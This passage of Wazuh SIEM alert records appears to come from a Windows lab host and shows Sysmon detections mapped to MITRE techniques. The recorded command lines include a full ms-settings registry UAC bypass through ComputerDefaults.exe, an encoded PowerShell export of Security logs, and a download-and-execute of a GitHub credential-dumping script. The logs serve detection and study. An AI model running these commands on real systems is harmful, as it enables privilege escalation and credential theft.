            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:19:45.544\r\nProcessGuid: {994437b3-04b1-68c3-8827-000000000e00}\r\nProcessId: 7908\r\nImage: C:\\Windows\\System32\\ComputerDefaults.exe\r\nFileVersion: 10.0.22621.1 (WinBuild.160101.0800)\r\nDescription: Set Program Access and Computer Defaults Control Panel\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: ComputerDefaults.EXE\r\nCommandLine: \"C:\\Windows\\System32\\ComputerDefaults.exe\" \r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150\r\nParentProcessGuid: {994437b3-04b0-68c3-8727-000000000e00}\r\nParentProcessId: 4588\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"New-Item \\\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\" -Force; New-ItemProperty \\\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\" -Name \\\"DelegateExecute\\\" -Value \\\"\\\" -Force; Set-ItemProperty \\\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\" -Name \\\"(default)\\\" -Value \\\"C:\\Windows\\System32\\cmd.exe\\\" -Force; Start-Process \\\"C:\\Windows\\System32\\ComputerDefaults.exe\\\"\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:19:45.5492510Z",
            "eventRecordID": "9848",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 1,
        "mail": true,
        "level": 14,
        "description": "Powershell process invoked known auto-elevated utility ComputerDefaults.EXE, may have been used to bypass UAC",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Bypass User Account Control"
          ],
          "id": [
            "T1548.002"
          ],
          "tactic": [
            "Privilege Escalation",
            "Defense Evasion"
          ]
        },
        "id": "92056"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611185.1319274",
      "timestamp": "2025-09-11T17:19:45.899+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:19:45.899Z"
      ]
    },
    "sort": [
      1757611185899
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "GEfKOZkBIDwfn7_zeapn",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "targetObject": "HKU\\\\S-1-5-21-408201590-265074577-2736629837-1001_Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\(Default)",
            "processGuid": "{994437b3-04b0-68c3-8727-000000000e00}",
            "processId": "4588",
            "utcTime": "2025-09-11 17:19:45.474",
            "ruleName": "T1042",
            "details": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "eventType": "SetValue",
            "user": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "13",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Registry value set:\r\nRuleName: T1042\r\nEventType: SetValue\r\nUtcTime: 2025-09-11 17:19:45.474\r\nProcessGuid: {994437b3-04b0-68c3-8727-000000000e00}\r\nProcessId: 4588\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-408201590-265074577-2736629837-1001_Classes\\ms-settings\\shell\\open\\command\\(Default)\r\nDetails: C:\\Windows\\System32\\cmd.exe\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "2",
            "systemTime": "2025-09-11T17:19:45.4762559Z",
            "eventRecordID": "9847",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "13",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 1,
        "mail": true,
        "level": 12,
        "description": "Command interpreter added to registry key associated to UAC bypass by auto-elevated processes",
        "groups": [
          "sysmon",
          "sysmon_eid13_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Bypass User Account Control",
            "Modify Registry"
          ],
          "id": [
            "T1548.002",
            "T1112"
          ],
          "tactic": [
            "Privilege Escalation",
            "Defense Evasion"
          ]
        },
        "id": "92305"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611185.1335881",
      "timestamp": "2025-09-11T17:19:45.906+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:19:45.906Z"
      ]
    },
    "sort": [
      1757611185906
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "BkfIOZkBIDwfn7_zXarA",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "PowerShell.EXE",
            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "product": "Microsoft® Windows® Operating System",
            "parentProcessGuid": "{994437b3-0426-68c3-7427-000000000e00}",
            "description": "Windows PowerShell",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\\\T1654_events.txt}\\\"",
            "processGuid": "{994437b3-0426-68c3-7527-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "6980",
            "processId": "4696",
            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
            "utcTime": "2025-09-11 17:17:26.873",
            "hashes": "MD5=13CCCB79AAFFFB07C94E586B75817486,SHA256=529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D",
            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "company": "Microsoft Corporation",
            "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -encodedCommand ZwBlAHQALQBlAHYAZQBuAHQAbABvAGcAIAAnAFMAZQBjAHUAcgBpAHQAeQAnACAAfAAgAHcAaABlAHIAZQAgAHsAJABfAC4ATQBlAHMAcwBhAGcAZQAgAC0AbABpAGsAZQAgACcAKgBTAFkAUwBUAEUATQAqACcAfQAgAHwAIABlAHgAcABvAHIAdAAtAGMAcwB2ACAAJABlAG4AdgA6AHQAZQBtAHAAXABUADEANgA1ADQAXwBlAHYAZQBuAHQAcwAuAHQAeAB0AA== -inputFormat xml -outputFormat text",
            "integrityLevel": "High",
            "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:17:26.873\r\nProcessGuid: {994437b3-0426-68c3-7527-000000000e00}\r\nProcessId: 4696\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.22621.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -encodedCommand ZwBlAHQALQBlAHYAZQBuAHQAbABvAGcAIAAnAFMAZQBjAHUAcgBpAHQAeQAnACAAfAAgAHcAaABlAHIAZQAgAHsAJABfAC4ATQBlAHMAcwBhAGcAZQAgAC0AbABpAGsAZQAgACcAKgBTAFkAUwBUAEUATQAqACcAfQAgAHwAIABlAHgAcABvAHIAdAAtAGMAcwB2ACAAJABlAG4AdgA6AHQAZQBtAHAAXABUADEANgA1ADQAXwBlAHYAZQBuAHQAcwAuAHQAeAB0AA== -inputFormat xml -outputFormat text\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=13CCCB79AAFFFB07C94E586B75817486,SHA256=529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D\r\nParentProcessGuid: {994437b3-0426-68c3-7427-000000000e00}\r\nParentProcessId: 6980\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\T1654_events.txt}\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:17:26.8756632Z",
            "eventRecordID": "9822",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 1,
        "mail": true,
        "level": 12,
        "description": "Powershell.exe spawned a powershell process which executed a base64 encoded command",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "PowerShell"
          ],
          "id": [
            "T1059.001"
          ],
          "tactic": [
            "Execution"
          ]
        },
        "id": "92057"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611047.1222736",
      "timestamp": "2025-09-11T17:17:27.599+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:17:27.599Z"
      ]
    },
    "sort": [
      1757611047599
    ]
  },



  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "-EfEOZkBIDwfn7_zxqn7",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "csc.exe",
            "image": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe",
            "product": "Microsoft® .NET Framework",
            "parentProcessGuid": "{994437b3-033d-68c3-6827-000000000e00}",
            "description": "Visual C# Command Line Compiler",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\\\"",
            "processGuid": "{994437b3-033f-68c3-6927-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "3200",
            "processId": "1444",
            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
            "utcTime": "2025-09-11 17:13:35.176",
            "hashes": "MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259",
            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "company": "Microsoft Corporation",
            "commandLine": "\\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\\\Users\\\\env-admin\\\\AppData\\\\Local\\\\Temp\\\\1rjqb4p0\\\\1rjqb4p0.cmdline\\\"",
            "integrityLevel": "High",
            "fileVersion": "4.8.9032.0 built by: NET481REL1",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:13:35.176\r\nProcessGuid: {994437b3-033f-68c3-6927-000000000e00}\r\nProcessId: 1444\r\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\nFileVersion: 4.8.9032.0 built by: NET481REL1\r\nDescription: Visual C# Command Line Compiler\r\nProduct: Microsoft® .NET Framework\r\nCompany: Microsoft Corporation\r\nOriginalFileName: csc.exe\r\nCommandLine: \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\env-admin\\AppData\\Local\\Temp\\1rjqb4p0\\1rjqb4p0.cmdline\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259\r\nParentProcessGuid: {994437b3-033d-68c3-6827-000000000e00}\r\nParentProcessId: 3200\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:13:35.1784052Z",
            "eventRecordID": "9801",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 2,
        "mail": false,
        "level": 6,
        "description": "Powershell script compiling code using CSC.exe, possible malware drop",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Compile After Delivery"
          ],
          "id": [
            "T1027.004"
          ],
          "tactic": [
            "Defense Evasion"
          ]
        },
        "id": "92006"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757610816.1173186",
      "timestamp": "2025-09-11T17:13:36.211+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:13:36.211Z"
      ]
    },
    "sort": [
      1757610816211
    ]
  },



